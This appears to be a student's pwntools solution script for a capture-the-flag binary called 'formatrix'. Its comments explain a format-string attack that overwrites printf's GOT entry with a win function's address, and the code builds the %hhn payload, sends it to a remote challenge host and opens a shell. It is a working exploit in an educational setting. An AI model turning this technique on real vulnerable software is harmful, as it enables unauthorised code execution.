#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# This program allows us to input a format string and it will print it. Doing 
# AAAA %x %x %x shows that our buffer's content 41414141 is at the third 4 bytes 
# offset. Hence, if we input AAAA %3$x this prints the start of our buffer.

# Looking in binary ninja, we can see there is a win function which gives us shell
# access, so it is clear we want to jump to this. In the main function, after fgets
# is called for our input, and then sprintf to display our input, there is a call
# to puts. Hence, we can overwrite the address of the puts function in the GOT so that
# it calls the win function instead. However, what I failed to realise was that the
# win function calls puts itself, so it won't work correctly once puts is overwritten.
# So, we can see after the call to puts in main there is also a call to printf, and
# since the win function doesn't use printf, we are safe to overwrite it in the GOT.

# In binary ninja, the address of the win function is 0x8048536. When loading the
# program in gdb, we can use the command 'got' to view the GOT addresses (also note
# there is no RELRO protection enabled). From this, we can see the address
# 0x8049c18 holds the address of the printf function. We can also use objdump -d 
# challenges/./formatrix to find the addresses for GOT entries and the win function.

# Hence, in our format string we want to overwrite the address 0x8049c18 to instead
# point to the address 0x8048536, which contains the win function. When placing the
# address of the win function into our payload, since the system is little endian,
# we input it in little endian format, putting the least significant byte first.

# To create our payload, we do it a single byte at a time. 

# First byte: At 16 (4 + 4 + 4 + 4), need 0x36 = 54
# Hence we write 54 - 16 = 38 bytes.

# Second byte: At 54, need 0x85 = 133
# Hence we write 133 - 54 = 79 bytes.

# Third byte: At 133, need 0x04 = 4
# Hence we write 256 - 133 + 4 = 127 bytes.

# Fourth byte: At 4, need 0x08 = 8
# Hence we write 8 - 4 = 4 bytes.
# However, this doesn't seem to overwrite it correctly, so instead I overflow it and
# then add 4, making the payload length 256 + 4 = 260.

# The script:

p = remote("plsdonthaq.me", 4003)

# Since the protections are disabled, we can simply hardcode the address for both
# the GOT entry for printf, and the address of the win function.
printfGOT = 0x8049c18
win = 0x8048536

# Our format string then consists of the 4 address offsets that we are going to write
# to, and then for each byte of the win function's address, we get the decimal value
# and add that many bytes to the payload, using %n to write this amount to the address
format_str = (
  p32(printfGOT) + p32(printfGOT + 1) + p32(printfGOT + 2) + p32(printfGOT + 3) +
  b"%38x" + b"%3$hhn" +
  b"%79x" + b"%4$hhn" +
  b"%127x" + b"%5$hhn" +
  b"%260x" + b"%6$hhn"
)

# NOTE: To help debug what value we are overwriting the GOT entry for printf, we can
# attach the process to gdb, then type continue in the gdb terminal and it should say
# 'Invalid address 0x36850408', which made me realise I need to give the win function
# address in little endian format.
#pid = gdb.attach(p)

# We then send the format string as input
p.sendline(format_str)

# And once entered the win function, we have access to a shell to get the flag
p.interactive()